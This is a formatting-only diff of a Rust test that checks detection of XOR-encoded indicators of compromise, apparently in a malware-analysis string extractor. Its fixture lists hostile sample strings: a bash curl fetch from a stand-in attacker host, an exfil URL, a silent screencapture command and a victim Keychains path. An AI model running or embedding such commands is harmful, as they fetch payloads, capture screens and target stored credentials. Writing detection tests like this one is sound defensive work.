@@ -223,12 +223,12 @@ fn test_auto_detected_xor_key_in_output() {
     // XOR-encode several high-value IOCs to exceed the 375 confidence threshold.
     // Each shell command scores 100, URLs score 50, suspicious paths score 75.
     let iocs: &[&[u8]] = &[
-        b"osascript -e 'tell application \"Finder\"'",          // +100 (shell)
+        b"osascript -e 'tell application \"Finder\"'", // +100 (shell)
         b"/bin/bash -c 'curl http://evil.example.com/payload'", // +100 (shell)
-        b"screencapture -x /tmp/screen.png",                    // +100 (shell)
-        b"http://46.30.191.141/api/check",                      // +50  (URL)
-        b"https://evil.example.com/exfil",                       // +50  (URL)
-        b"/Users/victim/Library/Keychains",                      // +75  (sus path)
+        b"screencapture -x /tmp/screen.png",           // +100 (shell)
+        b"http://46.30.191.141/api/check",             // +50  (URL)
+        b"https://evil.example.com/exfil",             // +50  (URL)
+        b"/Users/victim/Library/Keychains",            // +75  (sus path)
     ];
 
     for ioc in iocs {
@@ -266,7 +266,11 @@ fn test_auto_detected_xor_key_in_output() {
          Kinds present: {:?}",
         extracted
             .iter()
-            .map(|s| format!("{}:{:?}", s.value.chars().take(30).collect::<String>(), s.kind))
+            .map(|s| format!(
+                "{}:{:?}",
+                s.value.chars().take(30).collect::<String>(),
+                s.kind
+            ))
             .collect::<Vec<_>>()
     );
 
